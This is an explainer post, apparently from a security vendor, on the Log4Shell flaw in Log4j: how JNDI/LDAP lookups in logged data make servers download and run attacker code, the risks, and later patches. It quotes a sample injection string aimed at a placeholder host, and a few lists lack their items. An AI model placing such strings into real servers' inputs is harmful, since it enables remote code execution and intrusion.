@@ -1,0 +1,32 @@
+Just when you thought it was safe to relax for the weekend…
+…and your cybersecurity Christmas decorations lit up with the latest funkily-named bug: Log4Shell.
+Apparently, early reports of the bug referred to it as “LogJam”, because it allows you to JAM dodgy download requests into entries in LOG files.
+But LogJam was already taken (in that one, LOG referred to discrete logarithms, as performed in cryptographic calculations, not to logfiles).
+So, Log4Shell it became.
+The name Log4Shell refers to the fact that this bug is present in a popular Java code library called Log4j (Logging for Java), and to the fact that, if successfully exploited, attackers get what is effectively a shell – a way to run any system code of their choosing.
+Unfortunately, the vulnerability was tweeted out as a zero-day hole (the name for a security bug that’s documented before a patch is out), and published as a proof-of-concept (PoC) on GitHub, so the world first got to hear about it while it was still unpatched.
+The bug, now officially denoted CVE-2021-44228, involves sending a request to a vulnerable server in which you include some data – for example, an HTTP header – that you expect (or know) the server will write to its logfile.
+But you booby-trap that data so that the server, while wrangling the data into a format suitable for logging, kicks off a web download as an integral part of constructing the needed log entry.
+And not just any old download: if the data that comes back is a valid Java program (a .class file, in the jargon), then the server runs that file to “help” it generate the logging data.
+The trick is that, by default, unpatched versions of the Log4j library permit logging requests to trigger general-purpose LDAP (directory services) searches, as well as various other online lookups.
+That “feature” exists in order to help you convert not-very-useful data, for example user IDs such as OZZJ5JYPVK, into human-reabable information that makes sense on your network, such as Paul Ducklin.
+These requests happen via a commonly-used Java toolkit known as JNDI, short for Java Naming and Directory Interface, which is a Java module that makes it easy for Java code to carry out online lookups such as the above-mentioned user-ID-to-real-name conversion.
+That sounds dangerous, and it is, because it means that data being logged can trigger server-side code execution, but you might consider it to be mostly harmless if those “helper requests” only ever reach out to fully-trusted naming-and-directory servers inside your own network.
+But many servers out there aren’t set up that way, and so malicious “logsploiters” could try embedding text such as {$jndi:ldap://dodgy.example:389/badcode} in the data they expect you to log…
+…in the hope that, in the process of logging the data, your server will automatically:
+Simply put, this is what the jargon calls unauthenticated remote code execution (RCE). 
+Without logging in, or needing a password or access token, cybercriminals could use an innocent-looking request to trick your server into reaching out, downloading their code, and infecting itself with their malware.
+Depending on what sort of access rights your server has on your internal network, an RCE like this could help cybercriminals to perform a wide range of nefarious tasks.
+As you can imagine, attackers could, in theory: leak data from the server itself; learn details about the internal network it’s connected to; modify data on the server; exfiltrate data from other servers on the network; open additional backdoors on the server or the network for future attacks; implant additional malware such as network snoopers, memory scrapers, data stealers, cryptominers…
+…and so on.
+Apache, which looks after the Log4j product, has published an handy security advisory about the issue.
+Recommended steps you can take include:
+For information on the Log4shell issue and Sophos services, please consult our Security Advisory SOPHOS-SA-20211210-log4j-rce.
+Update. Apache has patched Log4j twice more since this article came out. The first update, to 2.16.0, patches against CVE-2021-45046, where a non-default configuration could permit remote code execution or data exfiltration, and a default configuration could allow a denial of service attack causing the affected process to hang. The second update, 2.17.0, patches against CVE-2021-45105, where a non-default configuration could allow an infinite loop, causing a denial of service in a similar way to the flaw patched in 2.16.0.Note that patching to 2.17.0 includes all previous fixes, dealing with CVE-2021-44228, CVE-2012-45046 and CVE-2021-45105 at the same time. For ongoing information, please refer to the official About Apache Log4j page. [2021-12-18T11:45:00Z]
+LEARN MORE – LOG4SHELL IN DETAIL
+Log4Shell explained – how it works, why you need to know, and how to fix it
+
+
+LEARN MORE – HOW CYBERCRIMINALS ARE USING THIS IN THE WILD
+Log4Shell Hell: anatomy of an exploit outbreak
+
